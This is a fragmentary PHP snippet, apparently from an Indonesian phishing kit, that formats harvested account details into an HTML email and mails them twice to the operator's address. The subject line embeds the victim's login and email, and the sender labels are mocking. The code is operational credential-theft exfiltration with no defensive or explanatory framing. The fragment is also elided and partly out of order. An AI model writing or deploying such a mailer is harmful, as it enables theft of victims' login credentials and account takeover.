...
// KONTEN RESULT AKUN
$subjek = "SETORAN IKY XD $login | PUNYA SI $email";
$pesan = '
<center> 
<div style="background: url(https://i.ibb.co/vvf8gxB/20201202-052201.jpg) no-repeat center center fixed; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
...
$headers .= 'From: ＩＴＳ　ＭＥ　ＩＫＹ　ＸＤ <tolool>';
$kirim = mail($emailku, $subjek, $pesan, $headers);

include 'css/css.php';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: SETORAN IKY XD <apadeck>';
$kirim = mail($emailku, $subjek, $pesan, $headers);
